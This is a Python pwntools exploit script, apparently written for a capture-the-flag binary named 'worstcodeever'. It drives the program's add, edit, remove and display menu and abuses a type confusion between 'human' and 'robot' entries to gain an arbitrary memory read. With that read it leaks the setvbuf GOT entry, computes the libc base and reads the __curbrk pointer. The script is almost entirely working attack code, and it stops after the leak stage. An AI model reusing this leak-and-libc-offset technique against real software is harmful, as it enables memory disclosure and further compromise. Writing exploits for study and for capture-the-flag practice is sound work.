from pwn.toplevel import *
from functools import *

# Helpful for debugging

class TeeWrite:
    def __init__(self, dest, user):
        self.dest = dest
        self.user = user
    
    def write(self, data):
        self.dest.write(data)
        self.user.write(data.decode())

    def flush(self):
        self.dest.flush()
        self.user.flush()

    def close(self):
        self.dest.close()

    @property
    def closed(self):
        return self.dest.closed or self.user.closed

class TeeRead:
    def __init__(self, dest, user):
        self.dest = dest
        self.user = user
    
    def read(self, size=-1):
        data = self.dest.read(size)
        self.user.write(data.decode())
        return data

    def close(self):
        self.dest.close()

    def fileno(self):
        return self.dest.fileno()

    @property
    def closed(self):
        return self.dest.closed or self.user.closed

io = process('./worstcodeever')
io.proc.stdin = TeeWrite(io.proc.stdin, sys.stdout)
io.proc.stdout = TeeRead(io.proc.stdout, sys.stdout)

# Commands

def cmd_add_human(name, age):
    io.sendafter(b'> ', b'1\n')
    io.sendafter(b'?', b'1\n')
    io.sendafter(b'?', name + b'\n')
    io.sendafter(b'?', str(age) + '\n')

def cmd_add_custom_human(friend_type, name, age):
    io.sendafter(b'> ', b'1\n')
    io.sendafter(b'?', str(friend_type) + '\n')
    io.sendafter(b'?', name + b'\n')
    io.sendafter(b'?', str(age) + '\n')

def cmd_add_custom_human_no_name(friend_type, age):
    io.sendafter(b'> ', b'1\n')
    io.sendafter(b'?', str(friend_type) + '\n')
    io.sendafter(b'?', str(age) + '\n')

def cmd_add_human_no_newline(name, age):
    io.sendafter(b'> ', b'1\n')
    io.sendafter(b'?', b'1\n')
    io.sendafter(b'?', name)
    io.sendafter(b'?', str(age) + '\n')

def cmd_add_robot(barcode, age):
    io.sendafter(b'> ', b'1\n')
    io.sendafter(b'?', b'0\n')
    io.sendafter(b'?', str(barcode) + '\n')
    io.sendafter(b'?', str(age) + '\n')

def cmd_remove(idx):
    io.sendafter(b'> ', b'2\n')
    io.sendafter(b'?', str(idx) + '\n')

def cmd_edit_human(idx, name, age):
    io.sendafter(b'> ', b'4\n')
    io.sendafter(b'?', str(idx) + '\n')
    io.sendafter(b'?', name + b'\n')
    io.sendafter(b'?', str(age) + '\n')

def cmd_edit_robot(idx, barcode, age):
    io.sendafter(b'> ', b'4\n')
    io.sendafter(b'?', str(idx) + '\n')
    io.sendafter(b'?', str(barcode) + '\n')
    io.sendafter(b'?', str(age) + '\n')

def cmd_display(idx):
    io.sendafter(b'> ', b'3\n')
    io.sendafter(b'?', str(idx) + '\n')
    line1_pt1 = io.recvuntil(b': ')
    line1_pt2 = io.recvline(keepends=False)
    line2_pt1 = io.recvuntil(b': ')
    line2_pt2 = io.recvline(keepends=False)

    if b'name' in line1_pt1:
        raise
        return None # TODO
    else:
        return p64(int(line1_pt2) % (2**64)) + p32(int(line2_pt2) % (2**32))

# Vuln

MIN_LEAK_IDX = 12
MAX_LEAK_IDX = MIN_LEAK_IDX + 5
leak_idx = MIN_LEAK_IDX

@partial(MemLeak, search_range=0)
def leaker(addr):
    print('Leaking ' + hex(addr))
    global leak_idx
    if leak_idx >= MAX_LEAK_IDX:
        return None
    cmd_add_custom_human_no_name(addr, 123)
    cmd_add_robot(456, 789)
    result = cmd_display(leak_idx)
    leak_idx += 1
    print(result)
    return result

# Exploit

SETVBUF_GOT_ADDR = 0x00602058
SETVBUF_LIBC_ADDR = 0x00171f90
CURBRK_LIBC_ADDR = 0x002be0a0

setvbuf_addr = leaker.u64(SETVBUF_GOT_ADDR)

libc_offset = setvbuf_addr - SETVBUF_LIBC_ADDR

curbrk_addr = libc_offset + CURBRK_LIBC_ADDR

print(leaker.u64(curbrk_addr))
